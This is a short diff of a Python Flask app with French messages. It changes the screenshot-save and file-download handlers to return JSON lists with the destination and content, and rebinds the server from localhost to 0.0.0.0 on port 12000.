@@ -77,7 +77,7 @@ def screeshot():
     f = open(dir, "wb")
     f.write(image.content)
     f.close()
-    return f"{filename} enregistré avec succès! DESTINATION: {dir}"
+    return json.dumps([f"{filename} enregistré avec succès!", "DESTINATION: ", dir])
     # except:
     #     return "Erreur lors de la capture d'écran"
 
@@ -98,13 +98,13 @@ def download():
         f = open(dir, "wb")
         f.write(result.content)
         f.close()
-        return json.dumps(f'{filename[:-1]} télécharger{result.content.decode("utf-8")}')
+        return json.dumps([f'{filename[:-1]} télécharger.', "", "DESTINATION:", dir, "","CONTENU:",result.content.decode("utf-8")])
     except Exception as e:
         return json.dumps(str(e))
 
 
 if __name__ == "__main__":
-    app.run(host="localhost", port=12000) 
+    app.run(host="0.0.0.0", port=12000) 
 
 
 
